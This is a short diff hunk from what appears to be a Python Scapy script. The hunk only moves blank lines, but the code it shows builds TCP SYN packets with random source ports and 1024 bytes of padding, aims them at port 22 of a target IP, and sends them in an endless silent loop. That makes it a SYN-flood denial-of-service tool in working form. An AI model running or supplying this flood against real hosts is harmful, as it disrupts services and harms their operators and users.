@@ -15,8 +15,7 @@ target_port = 22
 
 ip = IP(dst=target_ip)
 tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-
 raw = Raw(b"X"*1024)
-
 packet = ip/tcp/raw
+
 send(packet, loop=1, verbose=0)
